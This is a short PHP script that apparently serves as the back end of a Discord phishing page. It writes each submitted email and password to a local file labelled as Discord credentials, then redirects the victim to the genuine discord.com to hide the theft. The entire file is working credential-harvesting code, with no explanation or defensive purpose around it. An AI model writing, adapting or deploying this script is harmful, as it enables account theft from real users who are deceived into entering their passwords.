<?php 
file_put_contents("users.txt", "  [~] Discord User: " . $_POST['email'] . "\n  [~] Password: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com');
exit();
?>